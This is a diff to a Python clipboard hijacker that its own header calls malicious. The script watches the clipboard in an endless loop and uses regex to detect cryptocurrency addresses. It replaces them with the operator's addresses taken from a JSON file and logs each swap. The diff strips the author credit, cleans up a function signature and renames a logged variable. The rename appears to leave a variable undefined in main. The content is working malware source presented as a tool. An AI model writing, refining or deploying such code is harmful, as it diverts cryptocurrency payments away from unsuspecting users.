@@ -1,7 +1,5 @@
 # Warning! This code is malicious, I take 0 responsibility for misuse.
-# Created By github.com/jacques-andre
 
-# Function Definitions:
 # sniff -  go through regex_matches and find if clipboard contains any crypto if so: return what crypto
 # replace - load in crypto addresses from json file and replace clipboard
 
@@ -13,10 +11,9 @@ import argparse
 from datetime import datetime
 
 parser = argparse.ArgumentParser(
-    description="Replace crypto-addresses in clipboard with your own"
+    description="Replace crypto addresses found in the clipboard with your own"
 )
 parser.add_argument("--log", help="log output to log.txt", action="store_true")
-
 
 def main():
     # infinite loop: always checking the clipboard
@@ -32,16 +29,16 @@ def main():
             user_clipboard
         )  # returns what potential cryptos are in clipboard
         replacement_address = replace(
-            user_clipboard, crypto_found
+            crypto_found
         )  # do the replacement
 
         if replacement_address != 0 and crypto_found != 0:
             log(
-                now, crypto_found, user_clipboard, replacement_address
+                current_time, crypto_found, user_clipboard, replacement_address
             )  # only log if found
 
 
-def replace(user_clipboard, crypto_found):
+def replace(crypto_found):
     with open("addresses.json") as json_file:
         master_addresses = json.load(json_file)
 
@@ -74,7 +71,7 @@ def sniff(user_clipboard):
 def log(current_time, crypto_found, user_clipboard, replacement_address):
     with open("log.txt", "a+") as log:
         log.write(
-            f"[{current_time}]: Found: {user_clipboard} ({crypto_found.upper()} address) -> {replacement_address} \n"
+            f"[{current_time}]Found:{user_clipboard}({crypto_found.upper()} address) -> {replacement_address} \n"
         )
 
 
